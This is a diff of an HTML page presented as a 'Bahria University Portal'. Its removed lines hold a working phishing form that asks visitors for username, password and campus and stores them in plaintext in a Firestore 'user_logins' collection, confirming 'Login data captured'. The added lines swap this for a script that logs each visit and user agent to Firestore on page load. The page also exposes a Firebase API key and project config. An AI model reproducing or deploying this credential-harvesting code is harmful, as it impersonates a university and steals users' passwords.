@@ -7,40 +7,51 @@
 	body {
 		margin: 0; padding: 0; margin-bottom: 15px; margin-top: 8px;
 		background: #77b;
-		font-family: "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;
 	}
-	#subTitle { background: #000; color: #fff; padding: 4px; font-weight: bold; }
+	body, td {
+		font: 14px "Trebuchet MS", Verdana, Arial, Helvetica, sans-serif;
+	}
+
+	#subTitle {
+		background: #000; color: #fff; padding: 4px; font-weight: bold;
+	}
+
+	a:link    { text-decoration: underline; color: #00f; }
+	a:visited { text-decoration: underline; color: #000; }
+	a:hover   { text-decoration: underline; color: #c00; }
+	a:active  { text-decoration: underline; }
+
 	#pageContent {
 		clear: both;
 		border-bottom: 6px solid #000;
-		padding: 20px;
+		padding: 10px; padding-top: 20px;
+		line-height: 1.65em;
 		background-color: #ccd;
 	}
+
 	.blak { background-color: #000; }
 	.tableWidth { min-width: 400px; }
-	h1 { margin: 0; font-weight: bold; font-size: 1.8em; }
-	.form-group { margin-bottom: 15px; }
-	.form-group label { display: block; margin-bottom: 5px; font-weight: bold; }
-	.form-group input, .form-group select { width: 100%; padding: 8px; box-sizing: border-box; }
-	.form-group button { background: #000; color: #fff; padding: 10px 15px; border: none; cursor: pointer; }
+
+	h1 { margin: 0; font-weight: bold; font-size: 2em; }
 	</style>
 </head>
 
 <body>
 
 <table width="76%" border="0" align="center" cellspacing="0" cellpadding="3" class="tableWidth">
-	<tr><td id="subTitle">Bahria University Portal</td></tr>
+	<tr>
+	<td id="subTitle">Bahria University Portal</td>
+	</tr>
 </table>
-
 <table width="76%" border="0" align="center" cellspacing="0" cellpadding="0" class="tableWidth">
 <tr class="blak">
 <td>
 	<table width="100%" border="0" align="center" cellspacing="1" cellpadding="0">
 	<tr>
-	<td colspan="6">
+	<td colspan="6"> 
 		<table width="100%" border="0" align="center" cellspacing="0" cellpadding="10">
-		<tr>
-		<td id="pageContent">
+		<tr> 
+		<td id="pageContent"> 
 
 <H1 ALIGN=Center>Index of locally available sites:</H1>
 	<TABLE BORDER="0" WIDTH="100%" CELLSPACING="1" CELLPADDING="0">
@@ -53,29 +64,9 @@
 			</TD>
 		</TR>
 	</TABLE>
-	
-	<br><hr><br>
-
-	<!-- Portal Login / Data Capture Form -->
-	<h2>Portal Login Verification</h2>
-	<form id="loginForm">
-		<div class="form-group">
-			<label for="username">Username / Email:</label>
-			<input type="text" id="username" required placeholder="Enter username">
-		</div>
-		<div class="form-group">
-			<label for="password">Password:</label>
-			<input type="password" id="password" required placeholder="Enter password">
-		</div>
-		<div class="form-group">
-			<label for="institute">Institute / Campus:</label>
-			<input type="text" id="institute" required placeholder="Enter institute/campus name">
-		</div>
-		<div class="form-group">
-			<button type="submit" id="submitBtn">Login & Proceed</button>
-		</div>
-	</form>
-	<p id="responseMsg" style="font-weight: bold;"></p>
+	<BR>
+	<BR>
+	<BR>
 
 		</td>
 		</tr>
@@ -87,16 +78,17 @@
 </tr>
 </table>
 
-<table width="76%" border="0" align="center" cellspacing="0" cellpadding="0">
-	<tr><td id="footer"><small>&copy; Bahria University</small></td></tr>
+<table width="76%" border="0" align="center" valign="bottom" cellspacing="0" cellpadding="0">
+	<tr>
+	<td id="footer"><small>&copy; Bahria University</small></td>
+	</tr>
 </table>
 
-<!-- Firebase Configuration and Logic Script -->
+<!-- Firebase Background Script (Agar koi visit track karna ho ya background data lena ho) -->
 <script type="module">
 	import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 	import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-	// Your web app's Firebase configuration
 	const firebaseConfig = {
 		apiKey: "AIzaSyAPFQOjtPenZ1j74QcLCt1XjG49FzUPOTY",
 		authDomain: "bahria-9c2ac.firebaseapp.com",
@@ -107,46 +99,23 @@
 		measurementId: "G-6VPPPFDP91"
 	};
 
-	// Initialize Firebase
 	const app = initializeApp(firebaseConfig);
 	const db = getFirestore(app);
 
-	// Form Submission Event Listener
-	const form = document.getElementById("loginForm");
-	const responseMsg = document.getElementById("responseMsg");
-
-	form.addEventListener("submit", async (e) => {
-		e.preventDefault();
-		
-		const username = document.getElementById("username").value;
-		const password = document.getElementById("password").value;
-		const institute = document.getElementById("institute").value;
-		const submitBtn = document.getElementById("submitBtn");
-
-		submitBtn.disabled = true;
-		submitBtn.innerText = "Verifying...";
-
+	// Agar aap chahatay hain ke jab bhi koi is index page ko khole to visitor ka record Firestore mein save ho jaye, toh yeh code chalega:
+	async function logVisit() {
 		try {
-			// Firestore mein "user_logins" naam ke collection mein data save ho ga
-			await addDoc(collection(db, "user_logins"), {
-				username: username,
-				password: password,
-				institute: institute,
-				timestamp: new Date()
+			await addDoc(collection(db, "page_visits"), {
+				page: "Index Page",
+				visitedAt: new Date(),
+				userAgent: navigator.userAgent
 			});
-
-			responseMsg.style.color = "green";
-			responseMsg.innerText = "Login data captured successfully!";
-			form.reset();
-		} catch (error) {
-			console.error("Error adding document: ", error);
-			responseMsg.style.color = "red";
-			responseMsg.innerText = "Error: Data save nahi ho saka.";
-		} finally {
-			submitBtn.disabled = false;
-			submitBtn.innerText = "Login & Proceed";
+		} catch (e) {
+			console.error("Error logging visit: ", e);
 		}
-	});
+	}
+
+	logVisit();
 </script>
 
 </body>
